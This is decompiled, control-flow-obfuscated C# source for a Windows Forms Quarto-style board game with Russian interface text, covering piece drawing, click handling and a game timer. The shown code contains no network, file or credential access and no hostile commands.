using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace Cytotechnologist;

public class Form1 : Form
{
	public class Figurine
	{
		public bool Dark;

		public bool Big;

		public bool Square;

		public bool Point;

		public Figurine(bool dark, bool big, bool square, bool point)
		{
			while (true)
			{
				int num = 184217523;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0x2B1A8AB5u) % 5u)
					{
					case 4u:
						num = (int)((num2 * 1254539346) ^ 0x2CD93448);
						continue;
					case 3u:
						Big = big;
						num = (int)(num2 * 1683364401) ^ -160149787;
						continue;
					case 0u:
						Dark = dark;
						num = ((int)num2 * -936373408) ^ -1370837709;
						continue;
					case 2u:
						break;
					default:
						Square = square;
						Point = point;
						return;
					}
					break;
				}
			}
		}

		public Figurine(Figurine copy)
		{
			Dark = copy.Dark;
			Big = copy.Big;
			Square = copy.Square;
			Point = copy.Point;
		}
	}

	private Form menu;

	private Random rnd = Form1.smethod_0();

	private Figurine[,] storage;

	private Figurine[,] board;

	private readonly int size = 60;

	public bool turn;

	private DateTime time;

	private int step;

	private PictureBox[,] pictureBox;

	private PictureBox[,] borderBox;

	private IContainer components = null;

	private static Type ComMember;

	private PictureBox pictureBox1;

	private Button button2;

	private Button button1;

	private RichTextBox richTextBox1;

	private Panel panel1;

	private Label label1;

	private Label label2;

	private Label label5;

	private Label label6;

	public Timer timer1;

	public Form1()
	{
		//IL_00e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ed: Expected O, but got Unknown
		InitializeComponent();
		Form1.smethod_1(richTextBox1, (HorizontalAlignment)2);
		pictureBox = new PictureBox[4, 4];
		borderBox = new PictureBox[4, 4];
		for (int i = 0; i < 4; i++)
		{
			for (int j = 0; j < 4; j++)
			{
				double num = ((j < 2) ? 0.0 : 4.1);
				PictureBox[,] array = pictureBox;
				int num2 = i;
				int num3 = j;
				PictureBox obj = Form1.smethod_2();
				Form1.smethod_3((Control)(object)obj, new Size(size - 8, size - 8));
				Form1.smethod_4((Control)(object)obj, new Point(4 + (int)(((double)j + num) * (double)size), 4 + i * size));
				Form1.smethod_5((Control)(object)obj, Color.White);
				array[num2, num3] = obj;
				Form1.smethod_6((Control)(object)pictureBox[i, j], new MouseEventHandler(PictureBoxIJ_MouseDown));
				PictureBox[,] array2 = borderBox;
				int num4 = i;
				int num5 = j;
				PictureBox obj2 = Form1.smethod_2();
				Form1.smethod_3((Control)(object)obj2, new Size(size - 2, size - 2));
				Form1.smethod_4((Control)(object)obj2, new Point(1 + (int)(((double)j + num) * (double)size), 1 + i * size));
				Form1.smethod_7((Control)(object)obj2, bool_0: false);
				array2[num4, num5] = obj2;
				Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)pictureBox[i, j]);
				Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)borderBox[i, j]);
			}
		}
		Form3 form_ = new Form3();
		Form1.smethod_10((Form)(object)form_, (Form)(object)this);
		menu = (Form)(object)form_;
		Form1.smethod_11((Control)(object)menu);
	}

	private void Form1_LocationChanged(object sender, EventArgs e)
	{
		Form1.smethod_13(menu, new Point(Form1.smethod_12((Form)(object)this).X + 8, Form1.smethod_12((Form)(object)this).Y + 51));
	}

	private void Form1_Shown(object sender, EventArgs e)
	{
		Form1.smethod_14(menu);
	}

	public void Button1_Click(object sender, EventArgs e)
	{
		bool flag = default(bool);
		while (true)
		{
			int num = 169146399;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x5D60068Eu) % 10u)
				{
				case 9u:
					num = (int)((num2 * 605369961) ^ 0x238E6BC6);
					continue;
				case 8u:
					num = (int)((num2 * 1403252523) ^ 0x6A38BC39);
					continue;
				case 7u:
					Form1.smethod_15(timer1);
					num = ((int)num2 * -2046226865) ^ 0x5AF16120;
					continue;
				case 5u:
					num = ((int)num2 * -630230200) ^ -1794596100;
					continue;
				case 3u:
				{
					Form control_ = menu;
					Form1.smethod_17((Control)(object)control_, Form1.smethod_16((Control)(object)control_) + 5);
					num = 1024871191;
					continue;
				}
				case 2u:
				{
					int num3;
					int num4;
					if (flag)
					{
						num3 = 2086267471;
						num4 = 2086267471;
					}
					else
					{
						num3 = 1822237346;
						num4 = 1822237346;
					}
					num = num3 ^ ((int)num2 * -125146322);
					continue;
				}
				case 1u:
					flag = Form1.smethod_16((Control)(object)menu) < 296;
					num = 1949656540;
					continue;
				case 0u:
					Form1.smethod_14(menu);
					num = (int)(num2 * 839179230) ^ -1132133330;
					continue;
				default:
					return;
				case 4u:
					break;
				case 6u:
					return;
				}
				break;
			}
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		int num5 = default(int);
		int num3 = default(int);
		while (true)
		{
			int num = -944912756;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xD3F758ABu) % 17u)
				{
				case 16u:
					Form1.smethod_7((Control)(object)pictureBox[num5, num3], bool_0: false);
					num = ((int)num2 * -171572755) ^ 0x557E57BC;
					continue;
				case 14u:
					num3++;
					num = ((int)num2 * -229254289) ^ -37530589;
					continue;
				case 13u:
					num5++;
					num = ((int)num2 * -2038524372) ^ 0x49FFE78E;
					continue;
				case 12u:
					num = ((int)num2 * -1134512267) ^ 0x4CBA000A;
					continue;
				case 11u:
					num = -1586500712;
					continue;
				case 10u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					Paint_Storage();
					Form1.smethod_7((Control)(object)button2, bool_0: false);
					num = (int)(num2 * 1562992198) ^ -1003015691;
					continue;
				case 9u:
					num = ((int)num2 * -779917267) ^ -455512966;
					continue;
				case 8u:
					Form1.smethod_5((Control)(object)borderBox[num5, num3], Color.White);
					num = (int)((num2 * 1747968770) ^ 0x89F8509);
					continue;
				case 7u:
					num3 = 0;
					num = -131179788;
					continue;
				case 6u:
					storage = new Figurine[4, 4];
					num5 = 0;
					num = ((int)num2 * -774471984) ^ -1135748010;
					continue;
				case 5u:
					Paint_Board();
					num = ((int)num2 * -540443867) ^ 0x1F719A12;
					continue;
				case 3u:
					storage[num5, num3] = new Figurine(num5 < 2, num3 % 2 == 0, num3 < 2, num5 % 2 == 1);
					num = (int)((num2 * 1175510892) ^ 0x7BCE34BD);
					continue;
				case 2u:
				{
					int num6;
					if (num5 < 4)
					{
						num = -1761149228;
						num6 = -1761149228;
					}
					else
					{
						num = -969994407;
						num6 = -969994407;
					}
					continue;
				}
				case 1u:
					board = new Figurine[4, 4];
					num = (int)(num2 * 2004473199) ^ -1591253953;
					continue;
				case 0u:
				{
					int num4;
					if (num3 >= 4)
					{
						num = -1728475427;
						num4 = -1728475427;
					}
					else
					{
						num = -1461806739;
						num4 = -1461806739;
					}
					continue;
				}
				default:
					return;
				case 4u:
					break;
				case 15u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Board()
	{
		Form1.smethod_20(pictureBox1, (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox1), Form1.smethod_16((Control)(object)pictureBox1)));
		Graphics graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
		int num = 0;
		bool flag2 = default(bool);
		int num4 = default(int);
		float num8 = default(float);
		float num7 = default(float);
		float num11 = default(float);
		float num12 = default(float);
		bool flag = default(bool);
		bool dark = default(bool);
		bool flag3 = default(bool);
		bool square = default(bool);
		bool point = default(bool);
		float num9 = default(float);
		Brush brush_ = default(Brush);
		while (true)
		{
			int num2 = -1879011241;
			while (true)
			{
				uint num3;
				switch ((num3 = (uint)num2 ^ 0xC7FF2764u) % 41u)
				{
				case 40u:
					num2 = ((int)num3 * -463228987) ^ -1760637772;
					continue;
				case 39u:
					flag2 = num4 < 4;
					num2 = -1573500215;
					continue;
				case 38u:
					num8 = (float)size * num7;
					num2 = (int)((num3 * 1575732433) ^ 0x3D37BF81);
					continue;
				case 37u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num2 = ((int)num3 * -1758937067) ^ 0x8D92DFF;
					continue;
				case 36u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num11 + (float)(num4 * size), num11 + (float)(num * size), num12, num12);
					num2 = ((int)num3 * -1629474648) ^ -1620871294;
					continue;
				case 35u:
				{
					int num19;
					int num20;
					if (!flag)
					{
						num19 = -1751485865;
						num20 = -1751485865;
					}
					else
					{
						num19 = -816687709;
						num20 = -816687709;
					}
					num2 = num19 ^ (int)(num3 * 1313680257);
					continue;
				}
				case 34u:
					num2 = ((int)num3 * -849755971) ^ -419880512;
					continue;
				case 33u:
					dark = board[num, num4].Dark;
					num2 = ((int)num3 * -643182564) ^ 0x28C24B7;
					continue;
				case 32u:
					num2 = (int)(num3 * 1892925932) ^ -1415231145;
					continue;
				case 31u:
					num7 = 1f;
					num2 = (int)((num3 * 1692905977) ^ 0x3F3720A4);
					continue;
				case 30u:
					flag3 = num < 4;
					num2 = -1230235142;
					continue;
				case 29u:
					square = board[num, num4].Square;
					num2 = ((int)num3 * -1965177711) ^ -937828100;
					continue;
				case 28u:
					num2 = (int)((num3 * 1938578965) ^ 0xF95AD57);
					continue;
				case 27u:
					num2 = (int)((num3 * 53086537) ^ 0x3B7D3688);
					continue;
				case 25u:
					num4 = 0;
					num2 = -349817706;
					continue;
				case 24u:
					point = board[num, num4].Point;
					num2 = (int)((num3 * 1155604045) ^ 0x6D32F8E5);
					continue;
				case 23u:
				{
					int num21;
					int num22;
					if (!point)
					{
						num21 = 232680438;
						num22 = 232680438;
					}
					else
					{
						num21 = 249663055;
						num22 = 249663055;
					}
					num2 = num21 ^ (int)(num3 * 2011140257);
					continue;
				}
				case 22u:
					num2 = (int)(num3 * 142669364) ^ -1844626407;
					continue;
				case 21u:
				{
					int num17;
					int num18;
					if (flag3)
					{
						num17 = 1407008113;
						num18 = 1407008113;
					}
					else
					{
						num17 = 1849635759;
						num18 = 1849635759;
					}
					num2 = num17 ^ (int)(num3 * 719463153);
					continue;
				}
				case 20u:
				{
					int num15;
					int num16;
					if (!square)
					{
						num15 = 1505606298;
						num16 = 1505606298;
					}
					else
					{
						num15 = 1919506660;
						num16 = 1919506660;
					}
					num2 = num15 ^ ((int)num3 * -1073390754);
					continue;
				}
				case 19u:
				{
					int num13;
					int num14;
					if (flag2)
					{
						num13 = 1066767039;
						num14 = 1066767039;
					}
					else
					{
						num13 = 1755324151;
						num14 = 1755324151;
					}
					num2 = num13 ^ (int)(num3 * 1945767995);
					continue;
				}
				case 18u:
					num11 = (float)size * (num9 / 2f);
					num12 = num8 * 0.9f / (float)Form1.smethod_27(2.0);
					num2 = (int)((num3 * 566873046) ^ 0x3B0504F1);
					continue;
				case 17u:
					Form1.smethod_24(graphics_, brush_, num11 + (float)(num4 * size), num11 + (float)(num * size), num12, num12);
					num2 = -1542167007;
					continue;
				case 16u:
					brush_ = Form1.smethod_25();
					num2 = ((int)num3 * -510283114) ^ 0x5FAE8864;
					continue;
				case 15u:
					Form1.smethod_28(graphics_, brush_, num11 + (float)(num4 * size), num11 + (float)(num * size), num12, num12);
					num2 = (int)((num3 * 1904410455) ^ 0x3FB7EE63);
					continue;
				case 14u:
					num9 = 1f - num7 * 0.4f / (float)Form1.smethod_27(2.0);
					num11 = (float)size * (num9 / 2f);
					num12 = num8 * 0.4f / (float)Form1.smethod_27(2.0);
					num2 = -2120573371;
					continue;
				case 13u:
					num7 = 0.7f;
					num2 = -1979164980;
					continue;
				case 12u:
					num2 = -209488084;
					continue;
				case 11u:
					Form1.smethod_24(graphics_, Form1.smethod_23(), ((float)num4 + 0.05f) * (float)size, ((float)num + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num2 = ((int)num3 * -230148458) ^ -879824182;
					continue;
				case 10u:
					num2 = ((int)num3 * -2007443869) ^ 0x43870525;
					continue;
				case 9u:
				{
					int num10;
					if (board[num, num4].Big)
					{
						num2 = -2108487328;
						num10 = -2108487328;
					}
					else
					{
						num2 = -118757870;
						num10 = -118757870;
					}
					continue;
				}
				case 8u:
					num++;
					num2 = (int)((num3 * 1524605007) ^ 0x5B0A0727);
					continue;
				case 6u:
					num9 = 1f - num7 * 0.9f / (float)Form1.smethod_27(2.0);
					num2 = -1911997479;
					continue;
				case 5u:
					num2 = -21537698;
					continue;
				case 4u:
					flag = board[num, num4] != null;
					num2 = ((int)num3 * -1791732030) ^ -1540564508;
					continue;
				case 3u:
					num2 = -1409578997;
					continue;
				case 2u:
				{
					int num5;
					int num6;
					if (dark)
					{
						num5 = -1264747790;
						num6 = -1264747790;
					}
					else
					{
						num5 = -887173024;
						num6 = -887173024;
					}
					num2 = num5 ^ (int)(num3 * 827047104);
					continue;
				}
				case 1u:
					brush_ = Form1.smethod_26();
					num2 = -729539741;
					continue;
				case 0u:
					num4++;
					num2 = ((int)num3 * -2010990846) ^ -1633283298;
					continue;
				default:
					return;
				case 7u:
					break;
				case 26u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Storage()
	{
		int num = 0;
		Brush brush_ = default(Brush);
		float num5 = default(float);
		float num4 = default(float);
		Graphics graphics_ = default(Graphics);
		float num13 = default(float);
		float num14 = default(float);
		float num19 = default(float);
		int num6 = default(int);
		bool big = default(bool);
		bool flag2 = default(bool);
		bool dark = default(bool);
		bool flag3 = default(bool);
		bool flag = default(bool);
		while (true)
		{
			int num2 = 1813838047;
			while (true)
			{
				uint num3;
				switch ((num3 = (uint)num2 ^ 0x798440EBu) % 37u)
				{
				case 36u:
					brush_ = Form1.smethod_26();
					num2 = 1786080148;
					continue;
				case 35u:
					num5 = 1f - num4 * 0.9f / (float)Form1.smethod_27(2.0);
					num2 = 2017217781;
					continue;
				case 34u:
					brush_ = Form1.smethod_25();
					num2 = ((int)num3 * -788464578) ^ -1959335465;
					continue;
				case 33u:
					Form1.smethod_28(graphics_, brush_, num13, num13, num14, num14);
					num2 = ((int)num3 * -551780652) ^ 0x665E6E10;
					continue;
				case 32u:
					num19 = (float)size * num4;
					num13 = (float)size * (num5 / 2f) - 4f;
					num14 = num19 * 0.9f / (float)Form1.smethod_27(2.0);
					num2 = (int)((num3 * 295737223) ^ 0x407FEB77);
					continue;
				case 31u:
					num6++;
					num2 = 686361932;
					continue;
				case 30u:
					num4 = 0.7f;
					num2 = 991050704;
					continue;
				case 29u:
					num2 = (int)((num3 * 371080348) ^ 0x7B6B0838);
					continue;
				case 28u:
					num2 = ((int)num3 * -1347376780) ^ 0x742A8BB9;
					continue;
				case 27u:
					num++;
					num2 = ((int)num3 * -817384995) ^ -2066299156;
					continue;
				case 26u:
					big = storage[num, num6].Big;
					num2 = 1185900783;
					continue;
				case 25u:
					flag2 = num6 < 4;
					num2 = 916507674;
					continue;
				case 24u:
					Form1.smethod_30((Control)(object)pictureBox[num, num6]);
					num2 = 2012712146;
					continue;
				case 23u:
					num13 = (float)size * (num5 / 2f) - 4f;
					num2 = ((int)num3 * -1415111999) ^ 0x17060D18;
					continue;
				case 22u:
					num2 = (int)(num3 * 183811841) ^ -2143571387;
					continue;
				case 21u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num13, num13, num14, num14);
					num2 = ((int)num3 * -1191315721) ^ -1203086755;
					continue;
				case 20u:
				{
					int num9;
					int num10;
					if (dark)
					{
						num9 = -1622280239;
						num10 = -1622280239;
					}
					else
					{
						num9 = -1251086337;
						num10 = -1251086337;
					}
					num2 = num9 ^ ((int)num3 * -942139125);
					continue;
				}
				case 19u:
				{
					int num22;
					int num23;
					if (!flag3)
					{
						num22 = -1557371321;
						num23 = -1557371321;
					}
					else
					{
						num22 = -1351578229;
						num23 = -1351578229;
					}
					num2 = num22 ^ (int)(num3 * 592653141);
					continue;
				}
				case 18u:
					Form1.smethod_24(graphics_, brush_, num13, num13, num14, num14);
					num2 = 2138842610;
					continue;
				case 17u:
					flag3 = storage[num, num6] != null;
					num2 = 253619817;
					continue;
				case 16u:
					num2 = ((int)num3 * -691566562) ^ 0x232604E;
					continue;
				case 15u:
					Form1.smethod_20(pictureBox[num, num6], (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox[num, num6]), Form1.smethod_16((Control)(object)pictureBox[num, num6])));
					num2 = ((int)num3 * -1201606921) ^ -1073324537;
					continue;
				case 14u:
					num6 = 0;
					num2 = 686361932;
					continue;
				case 13u:
				{
					int num20;
					int num21;
					if (big)
					{
						num20 = -1929781667;
						num21 = -1929781667;
					}
					else
					{
						num20 = -1828511870;
						num21 = -1828511870;
					}
					num2 = num20 ^ ((int)num3 * -711470230);
					continue;
				}
				case 12u:
					num14 = num19 * 0.4f / (float)Form1.smethod_27(2.0);
					num2 = ((int)num3 * -1059649441) ^ -783103599;
					continue;
				case 11u:
					num2 = (int)(num3 * 2094984635) ^ -117555036;
					continue;
				case 10u:
				{
					int num17;
					int num18;
					if (!flag2)
					{
						num17 = -2043097090;
						num18 = -2043097090;
					}
					else
					{
						num17 = -808945861;
						num18 = -808945861;
					}
					num2 = num17 ^ ((int)num3 * -1926127495);
					continue;
				}
				case 9u:
				{
					int num15;
					int num16;
					if (flag)
					{
						num15 = 1362203224;
						num16 = 1362203224;
					}
					else
					{
						num15 = 1295742709;
						num16 = 1295742709;
					}
					num2 = num15 ^ ((int)num3 * -2081273486);
					continue;
				}
				case 8u:
				{
					int num11;
					int num12;
					if (!storage[num, num6].Point)
					{
						num11 = -1953368703;
						num12 = -1953368703;
					}
					else
					{
						num11 = -810271039;
						num12 = -810271039;
					}
					num2 = num11 ^ (int)(num3 * 516890898);
					continue;
				}
				case 6u:
					flag = num < 4;
					num2 = 1231152721;
					continue;
				case 5u:
					num2 = (int)(num3 * 10187182) ^ -1879679432;
					continue;
				case 4u:
				{
					int num7;
					int num8;
					if (num6 < 2)
					{
						num7 = -2049252775;
						num8 = -2049252775;
					}
					else
					{
						num7 = -302924656;
						num8 = -302924656;
					}
					num2 = num7 ^ ((int)num3 * -320877631);
					continue;
				}
				case 2u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox[num, num6]));
					dark = storage[num, num6].Dark;
					num2 = (int)((num3 * 564392926) ^ 0x56844BB7);
					continue;
				case 1u:
					num4 = 1f;
					num2 = ((int)num3 * -939716058) ^ -2026793495;
					continue;
				case 0u:
					num5 = 1f - num4 * 0.4f / (float)Form1.smethod_27(2.0);
					num2 = 839884603;
					continue;
				default:
					return;
				case 3u:
					break;
				case 7u:
					return;
				}
				break;
			}
		}
	}

	public void StartGame()
	{
		bool flag = default(bool);
		int num5 = default(int);
		int num3 = default(int);
		int num4 = default(int);
		bool flag2 = default(bool);
		while (true)
		{
			int num = 766620694;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x2EF43156u) % 30u)
				{
				case 29u:
					num = ((int)num2 * -115113409) ^ 0x1E3DA9A6;
					continue;
				case 28u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = 1340762106;
					continue;
				case 27u:
				{
					int num10;
					int num11;
					if (!flag)
					{
						num10 = 1942701119;
						num11 = 1942701119;
					}
					else
					{
						num10 = 1485489699;
						num11 = 1485489699;
					}
					num = num10 ^ ((int)num2 * -266779327);
					continue;
				}
				case 26u:
				{
					int num7 = Form1.smethod_33(rnd, 4);
					Form1.smethod_5((Control)(object)borderBox[num5, num7], Color.Blue);
					num = (int)((num2 * 1989357181) ^ 0x7CF3F199);
					continue;
				}
				case 25u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник выбрал фигуру. Выберете поле на доске для установки этой фигуры.");
					step = 1;
					num = (int)((num2 * 1585784900) ^ 0x3C7A9356);
					continue;
				case 24u:
					num = ((int)num2 * -1053109815) ^ 0x3B464106;
					continue;
				case 23u:
					num = ((int)num2 * -1496990359) ^ -1639731244;
					continue;
				case 22u:
					Form1.smethod_36(timer1);
					num = ((int)num2 * -994148122) ^ -160806098;
					continue;
				case 21u:
					num3 = 0;
					num = (int)((num2 * 3740966) ^ 0x5ABEBBA3);
					continue;
				case 20u:
					Form1.smethod_7((Control)(object)pictureBox[num3, num4], bool_0: true);
					num = 582234334;
					continue;
				case 19u:
				{
					int num8;
					int num9;
					if (flag2)
					{
						num8 = 809284363;
						num9 = 809284363;
					}
					else
					{
						num8 = 2007431156;
						num9 = 2007431156;
					}
					num = num8 ^ (int)(num2 * 1431747038);
					continue;
				}
				case 18u:
					num = ((int)num2 * -1032424965) ^ 0x3767D4C4;
					continue;
				case 17u:
					num3++;
					num = ((int)num2 * -1132710276) ^ -402226350;
					continue;
				case 16u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ваш ход. Выберете фигуру, которой будет играть противник.");
					num = (int)((num2 * 1821206544) ^ 0x163E8039);
					continue;
				case 15u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = (int)(num2 * 475625491) ^ -322179986;
					continue;
				case 14u:
					Form1_Load(this, Form1.smethod_31());
					num = (int)(num2 * 50338534) ^ -1626253141;
					continue;
				case 13u:
				{
					int num6;
					if (num4 >= 4)
					{
						num = 41899233;
						num6 = 41899233;
					}
					else
					{
						num = 1266074778;
						num6 = 1266074778;
					}
					continue;
				}
				case 11u:
					num = (int)(num2 * 779924323) ^ -1594842069;
					continue;
				case 10u:
					num = (int)(num2 * 1105158008) ^ -1151861243;
					continue;
				case 9u:
					step = 0;
					num = (int)(num2 * 1470266533) ^ -526105874;
					continue;
				case 8u:
					num5 = Form1.smethod_33(rnd, 4);
					num = 1669973640;
					continue;
				case 7u:
					num = ((int)num2 * -1364356641) ^ -438180104;
					continue;
				case 5u:
					flag2 = turn;
					num = ((int)num2 * -2093021130) ^ 0x1D233EFB;
					continue;
				case 4u:
					num4++;
					num = (int)(num2 * 328350383) ^ -99624885;
					continue;
				case 3u:
					num = (int)(num2 * 555784522) ^ -1772538004;
					continue;
				case 2u:
					num4 = 0;
					num = 1129246071;
					continue;
				case 1u:
					time = new DateTime(0L, DateTimeKind.Unspecified);
					Form1.smethod_35(timer1, bool_0: true);
					num = (int)((num2 * 211901311) ^ 0x2B5A2849);
					continue;
				case 0u:
					flag = num3 < 4;
					num = 906165549;
					continue;
				default:
					return;
				case 12u:
					break;
				case 6u:
					return;
				}
				break;
			}
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		while (true)
		{
			int num = 158703163;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x204A9950u) % 5u)
				{
				case 3u:
					time = time.AddSeconds(1.0);
					num = (int)(num2 * 1395169413) ^ -1889463077;
					continue;
				case 1u:
					num = (int)(num2 * 1146649227) ^ -1348729191;
					continue;
				case 0u:
					Form1.smethod_32((Control)(object)label1, Form1.smethod_34("Время: ", time.ToString("HH:mm:ss")));
					num = ((int)num2 * -2142538393) ^ 0x60198B5A;
					continue;
				default:
					return;
				case 2u:
					break;
				case 4u:
					return;
				}
				break;
			}
		}
	}

	private void PictureBoxIJ_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_006e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		Point point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
		int num5 = default(int);
		int num3 = default(int);
		int num4 = default(int);
		bool flag3 = default(bool);
		int num6 = default(int);
		bool flag4 = default(bool);
		bool flag = default(bool);
		bool flag2 = default(bool);
		while (true)
		{
			int num = -1589670671;
			while (true)
			{
				uint num2;
				int num7;
				switch ((num2 = (uint)num ^ 0xDD207057u) % 24u)
				{
				case 23u:
					num5 = 0;
					num = -1425435045;
					continue;
				case 22u:
					num3 -= 4;
					num = (int)(num2 * 686583214) ^ -1430217575;
					continue;
				case 21u:
					num4 = 0;
					num = (int)((num2 * 685579365) ^ 0x4275069D);
					continue;
				case 20u:
					flag3 = num5 < 4;
					num = -1324750567;
					continue;
				case 19u:
					num7 = ((Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox[num6, num3]), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0)) ? 1 : 0);
					goto IL_0092;
				case 18u:
				{
					int num10;
					int num11;
					if (flag4)
					{
						num10 = -495010538;
						num11 = -495010538;
					}
					else
					{
						num10 = -926796828;
						num11 = -926796828;
					}
					num = num10 ^ (int)(num2 * 176295479);
					continue;
				}
				case 17u:
					flag4 = num4 < 4;
					num = -2042738731;
					continue;
				case 15u:
				{
					int num14;
					int num15;
					if (!flag)
					{
						num14 = 1822578815;
						num15 = 1822578815;
					}
					else
					{
						num14 = 902582635;
						num15 = 902582635;
					}
					num = num14 ^ (int)(num2 * 2051165086);
					continue;
				}
				case 14u:
				{
					int num12;
					int num13;
					if (flag3)
					{
						num12 = 2123330677;
						num13 = 2123330677;
					}
					else
					{
						num12 = 1392825218;
						num13 = 1392825218;
					}
					num = num12 ^ (int)(num2 * 1023708489);
					continue;
				}
				case 13u:
				{
					int num8;
					int num9;
					if (!flag2)
					{
						num8 = 1923179238;
						num9 = 1923179238;
					}
					else
					{
						num8 = 145017639;
						num9 = 145017639;
					}
					num = num8 ^ ((int)num2 * -1120384347);
					continue;
				}
				case 12u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num = ((int)num2 * -1011461085) ^ 0x30F1F81;
					continue;
				case 11u:
					num = (int)((num2 * 744557642) ^ 0x65178CC0);
					continue;
				case 10u:
					if (storage[num6, num3] != null)
					{
						num = -456175036;
						continue;
					}
					num7 = 0;
					goto IL_0092;
				case 9u:
					num = ((int)num2 * -1108614596) ^ -674165738;
					continue;
				case 7u:
					Form1.smethod_32((Control)(object)richTextBox1, "Именно эта фигура? Если да - нажмите \"Подтвердить\".");
					num = (int)((num2 * 1880625059) ^ 0x2D0312CA);
					continue;
				case 6u:
					num6 = point.Y / size;
					point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
					num = (int)(num2 * 1525415022) ^ -987593502;
					continue;
				case 5u:
					Form1.smethod_5((Control)(object)borderBox[num6, num3], Color.Red);
					num = ((int)num2 * -1570786909) ^ -525440236;
					continue;
				case 4u:
					Form1.smethod_5((Control)(object)borderBox[num4, num5], Color.White);
					num5++;
					num = -1425435045;
					continue;
				case 3u:
					num4++;
					num = ((int)num2 * -1207886226) ^ -1610419340;
					continue;
				case 2u:
					num = (int)(num2 * 602705404) ^ -1765749600;
					continue;
				case 1u:
					num3 = point.X / size;
					num = (int)(num2 * 2029170096) ^ -1653408985;
					continue;
				case 0u:
					flag = num3 > 1;
					num = ((int)num2 * -685431891) ^ 0x34A64818;
					continue;
				default:
					return;
				case 8u:
					break;
				case 16u:
					return;
					IL_0092:
					flag2 = (byte)num7 != 0;
					num = -1532113478;
					continue;
				}
				break;
			}
		}
	}

	private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_01e1: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f7: Expected O, but got Unknown
		int num10 = default(int);
		int num12 = default(int);
		int num7 = default(int);
		Graphics graphics_ = default(Graphics);
		int num6 = default(int);
		bool flag2 = default(bool);
		bool flag3 = default(bool);
		bool flag = default(bool);
		while (true)
		{
			int num = 2033348441;
			while (true)
			{
				uint num2;
				int num5;
				switch ((num2 = (uint)num ^ 0x6EC21DD2u) % 30u)
				{
				case 29u:
					num = (int)(num2 * 931049907) ^ -616304299;
					continue;
				case 27u:
					num = ((int)num2 * -296373364) ^ -1945630659;
					continue;
				case 26u:
					num10++;
					num = 1184006928;
					continue;
				case 25u:
					num12++;
					num = ((int)num2 * -811526683) ^ -327262481;
					continue;
				case 24u:
					Form1.smethod_32((Control)(object)richTextBox1, "Уверены? Для выполнения данного хода нажмите \"Подтвердить\".");
					num = ((int)num2 * -910056166) ^ -327520087;
					continue;
				case 23u:
					num = (int)(num2 * 1319585408) ^ -1542781942;
					continue;
				case 22u:
				{
					int num11;
					if (num10 < 4)
					{
						num = 1954191756;
						num11 = 1954191756;
					}
					else
					{
						num = 42392949;
						num11 = 42392949;
					}
					continue;
				}
				case 21u:
					num7 = Form1.smethod_38(e) / size;
					num = ((int)num2 * -1160332134) ^ -527738273;
					continue;
				case 20u:
					Form1.smethod_45(graphics_);
					num = (int)((num2 * 1230252658) ^ 0x337C3D65);
					continue;
				case 19u:
					num5 = ((board[num6, num7] == null) ? 1 : 0);
					goto IL_00f7;
				case 18u:
					num = (int)((num2 * 1434314102) ^ 0x59D3873C);
					continue;
				case 17u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)(num2 * 422623908) ^ -1722121798;
					continue;
				case 16u:
					flag2 = Form1.smethod_41((Control)(object)borderBox[num12, num10]) == Color.Blue;
					num = 1300191842;
					continue;
				case 15u:
					num6 = Form1.smethod_39(e) / size;
					num = ((int)num2 * -1543436183) ^ 0x45E8E0A5;
					continue;
				case 14u:
				{
					int num13;
					int num14;
					if (!flag3)
					{
						num13 = 218579589;
						num14 = 218579589;
					}
					else
					{
						num13 = 423575189;
						num14 = 423575189;
					}
					num = num13 ^ ((int)num2 * -1549068926);
					continue;
				}
				case 13u:
					num = ((int)num2 * -132151346) ^ -1175516215;
					continue;
				case 12u:
					flag3 = num12 < 4;
					num = 2085422460;
					continue;
				case 11u:
					num10 = 0;
					num = 345474608;
					continue;
				case 10u:
					if (Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0))
					{
						num = (int)(num2 * 711883358) ^ -118116315;
						continue;
					}
					num5 = 0;
					goto IL_00f7;
				case 9u:
					num12 = 0;
					num = ((int)num2 * -2077030107) ^ -2089934098;
					continue;
				case 8u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
